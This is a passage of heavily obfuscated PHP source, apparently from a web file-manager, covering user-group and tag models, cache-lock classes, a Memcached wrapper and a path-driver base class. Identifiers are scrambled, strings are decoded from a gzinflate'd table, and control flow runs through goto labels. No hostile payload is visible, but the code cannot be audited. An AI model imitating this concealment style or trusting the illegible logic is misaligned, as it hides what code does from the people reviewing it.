!isset($âŸİØ³˜[$è³¾ĞÖ [506]][$è³¾ĞÖ [1952]]) || $âŸİØ³˜[$è³¾ĞÖ [506]][$è³¾ĞÖ [1952]] == $è³¾ĞÖ [1921]) { return $this->groupShowRoot($“óìâÂ¥[count($“óìâÂ¥) - 1], $µÎİñ‰½); } if ($âŸİØ³˜[$è³¾ĞÖ [506]][$è³¾ĞÖ [1952]] == $è³¾ĞÖ [400]) { $Ø‘¨­¼ = explode($è³¾ĞÖ [50], $âŸİØ³˜[$è³¾ĞÖ [506]][$è³¾ĞÖ [1953]]); if ($Ø‘¨­¼) { $‹ØìÍ® = array_merge($‹ØìÍ®, $Ø‘¨­¼); } } return $‹ØìÍ®; } protected function resetParentLevel() { $¾˜¾ñ™ë =& $_SERVER[”ôÑ§ì¸]; $ÈßîÈª– = $¾˜¾ñ™ë[1866]; $²¨™çÈƒ = $this->select(); $²¨™çÈƒ = array_to_keyvalue($²¨™çÈƒ, $ÈßîÈª–); foreach ($²¨™çÈƒ as $¸Ä˜¶³ş) { $·ñÌçı = $¸Ä˜¶³ş; $ªîÌß = array(); while ($·ñÌçı[$¾˜¾ñ™ë[179]] != 0) { $ªîÌß[] = $·ñÌçı[$¾˜¾ñ™ë[179]]; $·ñÌçı = $²¨™çÈƒ[$·ñÌçı[$¾˜¾ñ™ë[179]]]; } $ªîÌß[] = 0; $ªîÌß = $¾˜¾ñ™ë[50] . implode($¾˜¾ñ™ë[50], array_reverse($ªîÌß)) . $¾˜¾ñ™ë[50]; $this->setNamePinyin($¸Ä˜¶³ş[$ÈßîÈª–], $¸Ä˜¶³ş[$¾˜¾ñ™ë[32]]); $this->where(array($ÈßîÈª– => $¸Ä˜¶³ş[$ÈßîÈª–]))->save(array($¾˜¾ñ™ë[619] => $ªîÌß)); } return $²¨™çÈƒ; } public function groupNameAuto($£Šô¢Ï, $àŠóè») { $òü««·ß =& $_SERVER[”ôÑ§ì¸]; $¸òö Ğ = $this->where(array($òü««·ß[444] => $£Šô¢Ï))->getField($òü««·ß[32], !0); if (!$¸òö Ğ || !in_array($àŠóè», $¸òö Ğ)) { return $àŠóè»; } for ($ó‰Æï‹§ = 1; $ó‰Æï‹§ <= count($¸òö Ğ) + 1; $ó‰Æï‹§++) { $’å¶ë± = $àŠóè» . "\50{$ó‰Æï‹§}\51"; if (!in_array($’å¶ë±, $¸òö Ğ)) { return $’å¶ë±; } } } public function groupSwitch($”íéñ³ç, $ĞÄ„ÚÚ) { $¬ëê„·£ =& $_SERVER[”ôÑ§ì¸]; $ÜŠ“ì§ = array($¬ëê„·£[1866] => array($¬ëê„·£[7], array($”íéñ³ç, $ĞÄ„ÚÚ))); $ÌÎÌâÇÃ = $this->where($ÜŠ“ì§)->select(); $ÌÎÌâÇÃ = array_to_keyvalue($ÌÎÌâÇÃ, $¬ëê„·£[1866]); if (!isset($ÌÎÌâÇÃ[$”íéñ³ç]) || !isset($ÌÎÌâÇÃ[$ĞÄ„ÚÚ]) || $ÌÎÌâÇÃ[$”íéñ³ç][$¬ëê„·£[179]] == 0) { return !1; } $ÜŠ“ì§ = array($¬ëê„·£[1866] => $”íéñ³ç); $×´Æ×‚æ = Model($¬ëê„·£[1956])->where($ÜŠ“ì§)->select(); if (!$×´Æ×‚æ) { $×´Æ×‚æ = array(); } foreach ($×´Æ×‚æ as $æ’®Œ¾) { $šäíÔÌ» = $æ’®Œ¾[$¬ëê„·£[1674]]; $ÜŠ“ì§ = array($¬ëê„·£[1674] => $šäíÔÌ», $¬ëê„·£[1866] => $ĞÄ„ÚÚ); $ïºÚ­×· = Model($¬ëê„·£[1956])->where($ÜŠ“ì§)->find(); if (!$ïºÚ­×·) { $•À“åÓ¦ = array($ĞÄ„ÚÚ => $æ’®Œ¾[$¬ëê„·£[1970]]); Model($¬ëê„·£[566])->userGroupAdd($šäíÔÌ», $•À“åÓ¦); } Model($¬ëê„·£[566])->userGroupRemove($šäíÔÌ», $”íéñ³ç); } $ÜŠ“ì§ = array($¬ëê„·£[177] => 2, $¬ëê„·£[179] => 0, $¬ëê„·£[452] => 1, $¬ëê„·£[537] => array($¬ëê„·£[7], array($”íéñ³ç, $ĞÄ„ÚÚ))); $–İ“ì¦À = Model($¬ëê„·£[847])->where($ÜŠ“ì§)->field($¬ëê„·£[1971])->select(); $–İ“ì¦À = array_to_keyvalue($–İ“ì¦À, $¬ëê„·£[537], $¬ëê„·£[180]); $ŸòƒìÎ˜ = !empty($–İ“ì¦À[$”íéñ³ç]) ? $–İ“ì¦À[$”íéñ³ç] : !1; if ($ŸòƒìÎ˜) { if (!$–İ“ì¦À[$ĞÄ„ÚÚ]) { $–İ“ì¦À[$ĞÄ„ÚÚ] = Model($¬ëê„·£[847])->groupRootAdd($ĞÄ„ÚÚ); } $åæ©×ÜÌ = $–İ“ì¦À[$ĞÄ„ÚÚ]; $ÜŠ“ì§ = array($¬ëê„·£[179] => $ŸòƒìÎ˜); $–İ“ì¦À = Model($¬ëê„·£[847])->where($ÜŠ“ì§)->field($¬ëê„·£[1972])->select(); if (!$–İ“ì¦À) { $–İ“ì¦À = array(); } Model($¬ëê„·£[847])->moveClearAuth = !1; foreach ($–İ“ì¦À as $ïĞèÃÅ») { $¬ùÇ²á  = $ïĞèÃÅ»[$¬ëê„·£[452]] == $¬ëê„·£[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¬ëê„·£[847])->move($ïĞèÃÅ»[$¬ëê„·£[180]], $åæ©×ÜÌ, $¬ùÇ²á ); } Model($¬ëê„·£[847])->moveClearAuth = !0; $ÜŠ“ì§ = array($¬ëê„·£[177] => 2, $¬ëê„·£[537] => $”íéñ³ç); $Â¦¥Åª = array($¬ëê„·£[537] => $ĞÄ„ÚÚ); Model($¬ëê„·£[1973])->where($ÜŠ“ì§)->save($Â¦¥Åª); Model($¬ëê„·£[1974])->where($ÜŠ“ì§)->save($Â¦¥Åª); } $this->_changeChildLevel($ÌÎÌâÇÃ[$”íéñ³ç], $ÌÎÌâÇÃ[$ĞÄ„ÚÚ], !0); $this->where(array($¬ëê„·£[179] => $”íéñ³ç))->save(array($¬ëê„·£[179] => $ĞÄ„ÚÚ)); $this->_clearChildrenCache($ÌÎÌâÇÃ[$ĞÄ„ÚÚ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($“ô­ÚŒ) { $ÖíùåÜÈ =& $_SERVER[”ôÑ§ì¸]; return array($ÖíùåÜÈ[1975] => array($“ô­ÚŒ[0], $ÖíùåÜÈ[1976]), $ÖíùåÜÈ[1977] => array($“ô­ÚŒ[0], $ÖíùåÜÈ[1978])); } protected function get($‡˜…º¬) { $´å„³’ =& $_SERVER[”ôÑ§ì¸]; $É¡¯òøø = Model($´å„³’[553])->metaGet($‡˜…º¬, $´å„³’[1979]); $äì¤Ú¸¬ = json_decode($É¡¯òøø, !0); return $äì¤Ú¸¬ ? $äì¤Ú¸¬ : array($´å„³’[1980] => $´å„³’[88], $´å„³’[412] => array()); } protected function set($¾ñù¥ÖÅ, $¿Õêí€») { $îğàæÙê =& $_SERVER[”ôÑ§ì¸]; $¿Õêí€» = $¿Õêí€» ? $¿Õêí€» : array($îğàæÙê[1980] => $îğàæÙê[88], $îğàæÙê[412] => array()); return Model($îğàæÙê[553])->metaSet($¾ñù¥ÖÅ, $îğàæÙê[1979], json_encode($¿Õêí€»)); } protected function getByTagID($«Œ‰¶”, $½¼€ã®á) { $ÔğöÍ·¦ =& $_SERVER[”ôÑ§ì¸]; if (!$«Œ‰¶” || !$½¼€ã®á) { return !1; } if (!Model($ÔğöÍ·¦[553])->getInfoSimple($«Œ‰¶”)) { return !1; } $ğ»Ûèª‰ = $this->get($«Œ‰¶”); if (!$ğ»Ûèª‰ || !isset($ğ»Ûèª‰[$ÔğöÍ·¦[412]])) { return !1; } $ÒŠÃß—Ï = array_find_by_field($ğ»Ûèª‰[$ÔğöÍ·¦[412]], $ÔğöÍ·¦[442], $½¼€ã®á); return is_array($ÒŠÃß—Ï) ? $ÒŠÃß—Ï : !1; } public function listSource($„ğ¿¸Ô, $çëÄÄİ†) { $ÆàŒ»¯å =& $_SERVER[”ôÑ§ì¸]; if ($çëÄÄİ† && !is_array($çëÄÄİ†)) { $çëÄÄİ† = array($çëÄÄİ†); } $¾Şà²¡¤ = $this->listData($„ğ¿¸Ô); $Üåå†€È = array(); foreach ($¾Şà²¡¤ as $Š®§£÷®) { $Œ×Ğ÷À¶ = $Š®§£÷®[$ÆàŒ»¯å[84]]; if (!$Œ×Ğ÷À¶) { continue; } if (!isset($Üåå†€È[$Œ×Ğ÷À¶])) { $Üåå†€È[$Œ×Ğ÷À¶] = array(); } $Üåå†€È[$Œ×Ğ÷À¶][] = $Š®§£÷®[$ÆàŒ»¯å[467]]; } $¹Şòú»¾ = array(); foreach ($Üåå†€È as $çí‡‹±ã => $å´åÍ¹¾) { $ëğâã›Ô = !0; if (!$çëÄÄİ†) { $¹Şòú»¾[] = $çí‡‹±ã; continue; } foreach ($çëÄÄİ† as $‘¯«Ãí) { if (!in_array($‘¯«Ãí, $å´åÍ¹¾)) { $ëğâã›Ô = !1; break; } } if ($ëğâã›Ô) { $¹Şòú»¾[] = $çí‡‹±ã; } } if (!$¹Şòú»¾) { return array(); } $ÊîşÓÂà = array($ÆàŒ»¯å[458] => array($ÆàŒ»¯å[459], $¹Şòú»¾), $ÆàŒ»¯å[537] => $„ğ¿¸Ô, $ÆàŒ»¯å[177] => SourceModel::TYPE_GROUP); $áë…ŠÑã = Model($ÆàŒ»¯å[1363])->listSource($ÊîşÓÂà); if (!$áë…ŠÑã || count($¹Şòú»¾) == $áë…ŠÑã[$ÆàŒ»¯å[409]][$ÆàŒ»¯å[410]]) { return $áë…ŠÑã; } $’èöã‚Ã = array(); $éôÀİÏş = array_to_keyvalue($áë…ŠÑã[$ÆàŒ»¯å[82]], $ÆàŒ»¯å[12], $ÆàŒ»¯å[180]); $–õĞÈªö = array_to_keyvalue($áë…ŠÑã[$ÆàŒ»¯å[83]], $ÆàŒ»¯å[12], $ÆàŒ»¯å[180]); $ªùÉÖï¡ = array_merge($–õĞÈªö, $éôÀİÏş); foreach ($¹Şòú»¾ as $Œ×Ğ÷À¶) { if (!in_array($Œ×Ğ÷À¶, $ªùÉÖï¡)) { $’èöã‚Ã[] = $Œ×Ğ÷À¶; } } if ($’èöã‚Ã) { $this->removeBySource($„ğ¿¸Ô, $’èöã‚Ã); } return $áë…ŠÑã; } protected function listData($ğ‹¹×’Ó) { $¹£ØÄí =& $_SERVER[”ôÑ§ì¸]; $ÑÁö«ñŞ = array($¹£ØÄí[1665] => 0, $¹£ØÄí[524] => array($¹£ØÄí[1981], 0), $¹£ØÄí[463] => $¹£ØÄí[1982] . $ğ‹¹×’Ó); $§’¸ŠÉ¬ = $¹£ØÄí[1983]; $“²êØŒñ = $this->field($§’¸ŠÉ¬)->where($ÑÁö«ñŞ)->order($¹£ØÄí[1984])->select(); return $“²êØŒñ ? $“²êØŒñ : array(); } protected function addToTag($ËùßÎ«ú, $¸—İ·Ò“, $¼¸‰Ÿòœ) { $€ šâşÂ =& $_SERVER[”ôÑ§ì¸]; if (!$this->getByTagID($ËùßÎ«ú, $¼¸‰Ÿòœ) || !$¸—İ·Ò“) { return !1; } if (!Model($€ šâşÂ[847])->pathInfo($¸—İ·Ò“)) { return !1; } $ó”¾‘ƒ´ = array($€ šâşÂ[1665] => 0, $€ šâşÂ[524] => $¼¸‰Ÿòœ, $€ šâşÂ[462] => $¸—İ·Ò“, $€ šâşÂ[463] => $€ šâşÂ[1985] . $ËùßÎ«ú, $€ šâşÂ[461] => $€ šâşÂ[12], $€ šâşÂ[1870] => 0); if ($this->where($ó”¾‘ƒ´)->find()) { return !1; } return $this->add($ó”¾‘ƒ´); } protected function removeFromTag($ÙÃò‰²Ä, $àé½ğÉ¯, $è÷”‚À) { $äõ˜”Öé =& $_SERVER[”ôÑ§ì¸]; if (!$this->getByTagID($ÙÃò‰²Ä, $è÷”‚À) || !$àé½ğÉ¯) { return !1; } if (is_array($àé½ğÉ¯)) { $àé½ğÉ¯ = array($äõ˜”Öé[7], $àé½ğÉ¯); } $¤†ô€¥ó = array($äõ˜”Öé[1665] => 0, $äõ˜”Öé[524] => $è÷”‚À, $äõ˜”Öé[463] => $äõ˜”Öé[1985] . $ÙÃò‰²Ä, $äõ˜”Öé[462] => $àé½ğÉ¯); return $this->where($¤†ô€¥ó)->delete(); } protected function removeByTag($˜ôŞÙ†”, $Ø´“—ù) { $”Œâ®üœ =& $_SERVER[”ôÑ§ì¸]; if (!$this->getByTagID($˜ôŞÙ†”, $Ø´“—ù)) { return !1; } $ûÀº‚İÏ = array($”Œâ®üœ[1665] => 0, $”Œâ®üœ[524] => $Ø´“—ù, $”Œâ®üœ[463] => $”Œâ®üœ[1985] . $˜ôŞÙ†”); return $this->where($ûÀº‚İÏ)->delete(); } protected function removeBySource($ÑÃÙöŸ…, $ØıÇÛ€) { $š›´”ä› =& $_SERVER[”ôÑ§ì¸]; if (!$ÑÃÙöŸ… || !$ØıÇÛ€) { return !1; } if (is_array($ØıÇÛ€)) { $ØıÇÛ€ = array($š›´”ä›[7], $ØıÇÛ€); } $•¸ÂŒ¿¢ = array($š›´”ä›[1665] => 0, $š›´”ä›[462] => $ØıÇÛ€, $š›´”ä›[524] => array($š›´”ä›[1045], 0), $š›´”ä›[463] => $š›´”ä›[1985] . $ÑÃÙöŸ…); return $this->where($•¸ÂŒ¿¢)->delete(); } } goto bŠÏòÕáÈè; A¾İß™®ä†: class CacheLockMemcached { public function lock($Öƒ†•², $ö¿†±”µ = 0) { $æ¢®‚Œ‡ = Cache::init(); $»ú±Å‚ = microtime(!0) + $ö¿†±”µ; while (microtime(!0) < $»ú±Å‚) { $ˆá£êÜŠ = $æ¢®‚Œ‡->get($Öƒ†•²); if (!$ˆá£êÜŠ || $ˆá£êÜŠ < microtime(!0)) { $İ¹°ùúí = $æ¢®‚Œ‡->handle->add($Öƒ†•², $»ú±Å‚, $ö¿†±”µ); if ($İ¹°ùúí) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ú’¿”„—) { return Cache::init()->get($ú’¿”„—); } public function unlock($òÀ®ı¾) { return Cache::init()->remove($òÀ®ı¾); } } class CacheLockDatabase { public function lock($ŞıãÍ, $şŒËòå´ = 0) { $™²ÄƒÙ” = Model($_SERVER[”ôÑ§ì¸][851]); $ÒÇš–ç = microtime(!0) + $şŒËòå´; while (microtime(!0) < $ÒÇš–ç) { $Ó×µİÀ = $™²ÄƒÙ”->get($ŞıãÍ); if (!$Ó×µİÀ || $Ó×µİÀ < microtime(!0)) { $ÈÛÜæÜÜ = $™²ÄƒÙ”->set($ŞıãÍ, $ÒÇš–ç); if ($ÈÛÜæÜÜ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($©‘ïåóï) { return Model($_SERVER[”ôÑ§ì¸][851])->get($©‘ïåóï); } public function unlock($äŠÒÖÀ¦) { Model($_SERVER[”ôÑ§ì¸][851])->remove($äŠÒÖÀ¦); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ºİäÎ¶ª, $Ş©ÒĞ›ï) { $ÌàıêÚ =& $_SERVER[”ôÑ§ì¸]; if (!class_exists($ÌàıêÚ[897])) { show_json($ÌàıêÚ[898], !1); } $this->cacheTime = $Ş©ÒĞ›ï; $this->handle = new Memcached(); if (is_array($ºİäÎ¶ª[$ÌàıêÚ[899]]) && count($ºİäÎ¶ª[$ÌàıêÚ[899]]) >= 1) { foreach ($ºİäÎ¶ª[$ÌàıêÚ[899]] as $Û§Áúœæ) { $ŞØêï™… = explode($ÌàıêÚ[4], $Û§Áúœæ); $this->handle->addServer($ŞØêï™…[0], $ŞØêï™…[1]); } } else { $this->handle->addServer($ºİäÎ¶ª[$ÌàıêÚ[195]], $ºİäÎ¶ª[$ÌàıêÚ[196]]); } } public function set($‡Ì‹ş³³, $€Û¿, $µ¸ÕšÒñ = false) { $µ¸ÕšÒñ = $µ¸ÕšÒñ ? $µ¸ÕšÒñ : $this->cacheTime; return $this->handle->set($‡Ì‹ş³³, $€Û¿, $µ¸ÕšÒñ); } public function get($ìİ˜ÊÙ) { return $this->handle->get($ìİ˜ÊÙ); } public function remove($‚ü‡²¡ã) { return $this->handle->delete($‚ü‡²¡ã); } public function deleteAll() { return $this->handle->flush(); } } goto Aœ‡…Ã›Ò; Cæ†‡Î…®Ñ: define($_SERVER[”ôÑ§ì¸][0], $_SERVER[”ôÑ§ì¸][1]); $_SERVER[­¿“¤è] = explode($_SERVER[”ôÑ§ì¸][2], gzinflate(substr($_SERVER[”ôÑ§ì¸][3], 10, -8))); function binCheckEq($ŞÏç, $´ÌøÆöü) { return $ŞÏç == $´ÌøÆöü; } goto CµÄâ„ö°—; eç†ÓîŸô—: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\137\157\160\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ô˜ÂŒª) { $Ë¯­³¤Ÿ =& $_SERVER[”ôÑ§ì¸]; $šÇîİÛ = defined($Ë¯­³¤Ÿ[2087]) && USER_ID ? USER_ID : $Ë¯­³¤Ÿ[12]; return "\125\x73\145\162\x4f\160\164\x69\157\x6e\137{$ô˜ÂŒª}\x5f" . $šÇîİÛ; } protected function filterWhere($áË€•Ï) { $¾£‰ñö‡ =& $_SERVER[”ôÑ§ì¸]; $áË€•Ï[$¾£‰ñö‡[1674]] = defined($¾£‰ñö‡[2087]) && USER_ID ? USER_ID : $¾£‰ñö‡[12]; return $áË€•Ï; } public function cacheRemoveUser($ÙÃ í±Ğ, $åÍ¥—·‚) { return Cache::remove("\125\163\145\x72\x4f\160\x74\x69\x6f\156\x5f{$ÙÃ í±Ğ}\137" . $åÍ¥—·‚); } protected function optionDefault($Á¯ù±À = '') { $¾ëÖÑ¤Ş =& $_SERVER[”ôÑ§ì¸]; if ($Á¯ù±À == $¾ëÖÑ¤Ş[12]) { return $GLOBALS[$¾ëÖÑ¤Ş[6]][$¾ëÖÑ¤Ş[2364]]; } if ($Á¯ù±À == $¾ëÖÑ¤Ş[2365]) { return $GLOBALS[$¾ëÖÑ¤Ş[6]][$¾ëÖÑ¤Ş[2366]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\56\164\x61\147\114\151\x73\x74"; public $modelType = "\125\163\145\162\x4f\160\164\x69\x6f\156"; public $field = array("\156\141\x6d\x65", "\x73\x74\x79\154\145", "\x73\x6f\x72\x74"); public function listData($Ú ‹ÚÎÔ = false, $Ø”èÑıÀ = "\163\x6f\162\x74", $Ú«²äÀ° = false) { return parent::listData($Ú ‹ÚÎÔ, $Ø”èÑıÀ, $Ú«²äÀ°); } public function remove($£Ê‚ÖÌö) { return parent::remove($£Ê‚ÖÌö); } public function add($ãŠãõ»œ, $æÈ„Á¥ = "\x6c\x61\x62\145\x6c\55\x67\162\x65\171\x2d\x6e\157\162\155\x61\x6c") { $Í ¡ª¾É =& $_SERVER[”ôÑ§ì¸]; if ($this->findByName($ãŠãõ»œ)) { return !1; } $­½æ¹Áİ = array($Í ¡ª¾É[461] => $ãŠãõ»œ, $Í ¡ª¾É[525] => $æÈ„Á¥, $Í ¡ª¾É[1870] => $this->getSort($Í ¡ª¾É[301]) + 1); return parent::insert($­½æ¹Áİ); } public function update($›½ÒÖŸ, $µŸó³æö) { $½ÁŸ‘¯Ø =& $_SERVER[”ôÑ§ì¸]; $²È¥ø•– = $this->listData($›½ÒÖŸ); $ü¸¾„ºÈ = $this->findByName($µŸó³æö[$½ÁŸ‘¯Ø[32]]); if (!$²È¥ø•– || $ü¸¾„ºÈ && $ü¸¾„ºÈ[$½ÁŸ‘¯Ø[442]] != $²È¥ø•–[$½ÁŸ‘¯Ø[442]]) { return !1; } return parent::update($›½ÒÖŸ, $µŸó³æö); } public function moveTop($›¾ùÄ“ğ) { $ğ¬¾ èÈ =& $_SERVER[”ôÑ§ì¸]; $Ğ§Î±´  = parent::listData(); $ùìºµÀÈ = $this->getSort($ğ¬¾ èÈ[300]); foreach ($Ğ§Î±´  as &$É‹ÀÌ¸) { if ($É‹ÀÌ¸[$ğ¬¾ èÈ[442]] == $›¾ùÄ“ğ) { $É‹ÀÌ¸[$ğ¬¾ èÈ[1890]] = $ùìºµÀÈ; continue; } $É‹ÀÌ¸[$ğ¬¾ èÈ[1890]] += 1; } unset($É‹ÀÌ¸); return parent::resetData($Ğ§Î±´ ); } public function moveBottom($ëßÒû‹) { $èâ¿Ê”ƒ =& $_SERVER[”ôÑ§ì¸]; $µ†—Åı = $this->getSort($èâ¿Ê”ƒ[301]) + 1; return parent::update($ëßÒû‹, array($èâ¿Ê”ƒ[1890] => $µ†—Åı)); } public function resetSort($Ñ»Š²Ûü) { $Ê‹­¿•Ã =& $_SERVER[”ôÑ§ì¸]; $Æñó£òİ = array(); $Ñ»Š²Ûü = is_array($Ñ»Š²Ûü) ? $Ñ»Š²Ûü : array(); for ($ëÈ¶´ê± = 0; $ëÈ¶´ê± < count($Ñ»Š²Ûü); $ëÈ¶´ê±++) { $Æñó£òİ[$Ñ»Š²Ûü[$ëÈ¶´ê±] . $Ê‹­¿•Ã[12]] = $ëÈ¶´ê± + 1; } $­†Áƒ¯€ = parent::listData(); foreach ($­†Áƒ¯€ as &$êÇà÷Õ‹) { $ôşôíà³ = $Æñó£òİ[$êÇà÷Õ‹[$Ê‹­¿•Ã[442]]]; $êÇà÷Õ‹[$Ê‹­¿•Ã[1890]] = $ôşôíà³ ? $ôşôíà³ : $êÇà÷Õ‹[$Ê‹­¿•Ã[1890]]; } unset($êÇà÷Õ‹); return parent::resetData($­†Áƒ¯€); } private function getSort($ êº¾¨) { $ª‚Ó×¿ =& $_SERVER[”ôÑ§ì¸]; $Î¶åù¬ = parent::listData(); $²ß™ºúõ = array_to_keyvalue($Î¶åù¬, $ª‚Ó×¿[12], $ª‚Ó×¿[1890]); if (!$²ß™ºúõ) { $²ß™ºúõ = array(0); } $««‹Éøë = $ êº¾¨ == $ª‚Ó×¿[301] ? max($²ß™ºúõ) : min($²ß™ºúõ); return intval($««‹Éøë); } } goto EñßƒóÌ°ô; Aê„ÎÍ¦ÉÏ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¦¨ÅŸœ =& $_SERVER[”ôÑ§ì¸]; $this->objectDriver = array($¦¨ÅŸœ[60], $¦¨ÅŸœ[61], $¦¨ÅŸœ[62], $¦¨ÅŸœ[63], $¦¨ÅŸœ[64], $¦¨ÅŸœ[65], $¦¨ÅŸœ[66], $¦¨ÅŸœ[67], $¦¨ÅŸœ[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($è¡¶ı¾®) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($è¡¶ı¾®, $_SERVER[”ôÑ§ì¸][8]); } return $è¡¶ı¾®; } public function iconvApp($ş‘áç£Ë) { return $ş‘áç£Ë; } public function iconvSystem($ËòÑ¦Ã) { return $ËòÑ¦Ã; } public function iconvTo($Œµ¾îı·, $£¾÷²±¡, $ÂˆÁÓÓ€) { $ÁØ¢óî÷ =& $_SERVER[”ôÑ§ì¸]; if (!$Œµ¾îı· || !function_exists($ÁØ¢óî÷[69])) { return $Œµ¾îı·; } static $¿ğÍŠÀ = array(); $“ÄÉ·’ = $£¾÷²±¡ . $ÁØ¢óî÷[70] . $ÂˆÁÓÓ€ . $ÁØ¢óî÷[71] . $Œµ¾îı·; if (isset($¿ğÍŠÀ[$“ÄÉ·’])) { return $¿ğÍŠÀ[$“ÄÉ·’]; } if (function_exists($ÁØ¢óî÷[72])) { $¯¯Ìà = @mb_convert_encoding($Œµ¾îı·, $ÂˆÁÓÓ€, $£¾÷²±¡); } else { $¯¯Ìà = @iconv($£¾÷²±¡, $ÂˆÁÓÓ€, $Œµ¾îı·); } $¯¯Ìà = $¯¯Ìà ? $¯¯Ìà : $Œµ¾îı·; if (strstr($¯¯Ìà, $ÁØ¢óî÷[73])) { $¯¯Ìà = str_replace($ÁØ¢óî÷[73], $ÁØ¢óî÷[11], $¯¯Ìà); } $¿ğÍŠÀ[$£¾÷²±¡ . $ÁØ¢óî÷[70] . $ÂˆÁÓÓ€ . $ÁØ¢óî÷[71] . $Œµ¾îı·] = $¯¯Ìà; $¿ğÍŠÀ[$ÂˆÁÓÓ€ . $ÁØ¢óî÷[70] . $£¾÷²±¡ . $ÁØ¢óî÷[71] . $Œµ¾îı·] = $Œµ¾îı·; $¿ğÍŠÀ[$ÂˆÁÓÓ€ . $ÁØ¢óî÷[70] . $£¾÷²±¡ . $ÁØ¢óî÷[71] . $¯¯Ìà] = $Œµ¾îı·; $¿ğÍŠÀ[$£¾÷²±¡ . $ÁØ¢óî÷[70] . $ÂˆÁÓÓ€ . $ÁØ¢óî÷[71] . $¯¯Ìà] = $¯¯Ìà; return $¯¯Ìà; } public function getPathInner($Ê¦µ¿–¡) { $àÁÏåø¾ = IO::init($Ê¦µ¿–¡); return $àÁÏåø¾->path; } public function getPathOuter($„¨ë†’ø) { $¦×çóşÕ =& $_SERVER[”ôÑ§ì¸]; $…á©ì†â = strlen(trim($this->pathBase, $¦×çóşÕ[8])); $„¨ë†’ø = substr(trim($„¨ë†’ø, $¦×çóşÕ[8]), $…á©ì†â); return $this->pathDriver . $¦×çóşÕ[8] . ltrim($„¨ë†’ø, $¦×çóşÕ[8]); } public function isParentOf($³’”êÉÓ, $Üø†õê) { $‘ô¹àÕ =& $_SERVER[”ôÑ§ì¸]; $³’”êÉÓ = rtrim(strtolower($³’”êÉÓ), $‘ô¹àÕ[8]) . $‘ô¹àÕ[8]; $Üø†õê = rtrim(strtolower($Üø†õê), $‘ô¹àÕ[8]) . $‘ô¹àÕ[8]; $¨±´²¦¦ = strpos($Üø†õê, $³’”êÉÓ) === 0; return $¨±´²¦¦; } public function getType() { $‡‹’¢ñö =& $_SERVER[”ôÑ§ì¸]; $…áÄ©İî = str_replace($‡‹’¢ñö[74], $‡‹’¢ñö[12], get_class($this)); return strtolower($…áÄ©İî); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Â¤’±â™, $™É¿Ö®) { $¨æÒ™Ì‰ =& $_SERVER[”ôÑ§ì¸]; $ƒ×õØØÙ = rtrim($Â¤’±â™, $¨æÒ™Ì‰[8]) . $¨æÒ™Ì‰[8] . $™É¿Ö®; $Úœ›µ‰ = $this->exist($ƒ×õØØÙ); return $Úœ›µ‰ ? $ƒ×õØØÙ : !1; } public function setModifyTime($Ù®ƒ¡Ñó, $ç·éÌƒ = '') { } public function renameObject($¡½ä¸éÑ, $½­¢¾Ú) { $­†Ğ°Çõ = $½­¢¾Ú; $¡½ä¸éÑ = $this->getPathOuter($¡½ä¸éÑ); $½­¢¾Ú = $this->pathFather($¡½ä¸éÑ) . $½­¢¾Ú; $®º¤â³ = IO::copy($¡½ä¸éÑ, $this->pathFather($¡½ä¸éÑ), REPEAT_RENAME_FOLDER, $­†Ğ°Çõ); if ($®º¤â³) { IO::remove($¡½ä¸éÑ); } return $®º¤â³ ? $½­¢¾Ú : !1; } public function tempFile($ê«ü“î¶ = '', $Àº–Åš = '') { if (!$ê«ü“î¶) { $ê«ü“î¶ = rand_string(15); } $åªùŞé = TEMP_FILES . rand_string(15) . $_SERVER[”ôÑ§ì¸][8]; @mkdir($åªùŞé, DEFAULT_PERRMISSIONS, !0); $éÃÖ÷ù = $åªùŞé . $ê«ü“î¶; @touch($éÃÖ÷ù); if ($Àº–Åš) { file_put_contents($éÃÖ÷ù, $Àº–Åš); } return $éÃÖ÷ù; } public function tempFileRemve($ÅáƒÔ†·) { @unlink($ÅáƒÔ†·); @rmdir($this->pathFather($ÅáƒÔ†·)); } public function mkfile($£×äÅ•, $›×ÅñÑø = '', $é”àèŠ = REPEAT_RENAME) { } public function mkdir($½§‡‰, $ì‰©ŠÂ¬ = REPEAT_SKIP) { } public function delFile($¾½ÊëŒâ) { } public function delFolder($ÂÆÌÁ¬ğ) { } public function copyFile($–‡õ âÇ, $–›Â¬˜) { } public function moveFile($÷ğ×ÁĞ, $î·²·×) { } public function remove($éª±ñÃœ) { if ($this->isFile($éª±ñÃœ)) { return $this->delFile($éª±ñÃœ); } return $this->delFolder($éª±ñÃœ); } public function rename($û™»•½ˆ, $¼ñ…ÅÇî) { } public function exist($º¶·²³à) { } public function findByHash($Çş‚å = '', $Ô–ı‡‹• = '') { return !1; } public function isFile($ªóğóòµ) { } public function isFolder($ŸÎ×¿¡‚) { } public function size($£º®Ù ®) { } public function info($‰ŒäĞšú) { } public function infoSimple($á€õ†¸Ş) { return $this->info($á€õ†¸Ş); } public function infoAuth($ßí¼§ï–) { return $this->info($ßí¼§ï–); } public function infoFull($ç´¶í–) { return $this->info($ç´¶í–); } public function infoFullSimple($Îíá®•Å) { return $this->info($Îíá®•Å); } public function infoWithChildren($Ÿ¥ã³ô) { $áíªªë =& $_SERVER[”ôÑ§ì¸]; static $Óõ»Õ¹ = array(); if (isset($Óõ»Õ¹[$Ÿ¥ã³ô])) { return $Óõ»Õ¹[$Ÿ¥ã³ô]; } $ŠøÈ¹Í– = $this->info($Ÿ¥ã³ô); if ($ŠøÈ¹Í– && $ŠøÈ¹Í–[$áíªªë[33]] == $áíªªë[75]) { $÷ªşºßÒ = array($áíªªë[76] => 0, $áíªªë[77] => 0, $áíªªë[78] => 0); $this->infoChildren($Ÿ¥ã³ô, $÷ªşºßÒ); $ŠøÈ¹Í–[$áíªªë[76]] = 